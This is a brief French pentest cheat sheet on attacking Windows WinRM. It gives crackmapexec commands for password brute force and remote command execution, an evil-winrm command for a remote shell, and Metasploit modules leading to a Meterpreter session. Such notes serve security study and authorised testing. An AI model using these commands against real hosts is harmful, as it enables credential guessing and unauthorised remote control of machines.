# WinRM
WinRM est un protocole de gestion à distance qui utilise HTTP(s) comme protocole de transport.  
Ports 5985 et 5986 (HTTPS).  

### crackmapexec
"crackmapexec" est un outil pour attaquer WinRM (mais aussi mssql, smb et ssh). Il faut préciser le protocole cible, l'IP cible, user et password.  
`crackmapexec winrm <IP_cible> -u administrator -p /usr/share/metasploit... ` permet de bruteforcer le service avec les listes indiquées.  

Une fois les credentials récupérées on peut envoyer des commandes à distance :  
`crackmapexec winrm <IP_cible> -u administrator -p PasswordOfTheDeath -x "systeminfo" `

### evil-winrm
Permet de récupérer un shell distant  
`evil-winrm.rb -u administrator -p 'PasswordOfTheDeath' -i <IP_CIBLE>`  

### Meterpreter avec Metasploit
`auxiliary/scanner/winrm/winrm_auth_method` : module de reconnaissance, Envoie des requêtes WinRM sans identifiants valides, observe les réponses du service WinRM, déduit les méthodes d’auth acceptées par la cible.  
`auxiliary/scanner/winrm/winrm_login` permet le brute force du service.  
`auxiliary/scanner/winrm/winrm_cmd` : Pour exécuter rapidement une commande Windows à distance via WinRM, avec des identifiants valides pour voir si le service est actif.  
 
Ce module suivant a besoin de connaitre les credentials pour être exécuté (avec evil-winrm ou crackmapexec)  
`use exploit/windows/winrm/winrm_script_exec` (RHOSTS, RPORT, USERNAME, PASSWORD...)  
`set FORCE_VBS true`  
Puis lancer et on obtient un meterpreter.  






